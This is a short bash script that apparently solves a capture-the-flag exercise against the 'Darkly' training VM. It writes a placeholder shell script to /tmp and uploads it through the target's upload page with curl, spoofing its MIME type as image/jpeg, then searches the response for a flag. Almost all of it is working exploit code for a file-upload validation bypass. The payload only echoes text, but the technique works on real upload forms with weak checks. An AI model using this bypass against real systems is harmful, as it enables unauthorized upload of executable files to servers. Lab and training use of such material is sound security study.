#!/bin/bash

# Check if the IP address is provided as a command-line argument
if [ -z "$1" ]; then
    echo "Usage: ./run.sh [darkly_vm_ip]"
    echo "Example: ./run.sh http://192.168.129.219/"
else
    # Define the target URL
    TARGET_URL="$1/index.php?page=upload"
    
    # Create a temporary malicious script file
    MALICIOUS_SCRIPT="/tmp/malicious_script.sh"
    echo "#!/bin/bash" > $MALICIOUS_SCRIPT
    echo "echo Malicious code executed!" >> $MALICIOUS_SCRIPT
    chmod +x $MALICIOUS_SCRIPT

    # Use curl to upload the malicious script with a spoofed MIME type
    RESPONSE=$(curl -s -X POST \
        -F "uploaded=@${MALICIOUS_SCRIPT};type=image/jpeg" \
        -F "Upload=Upload" "$TARGET_URL")

    # Check if the response contains the flag
    if echo "$RESPONSE" | grep -q 'flag'; then
        echo "Flag found!"
        echo "$RESPONSE" | grep 'flag'
    else
        echo "No flag found in the response."
    fi
fi
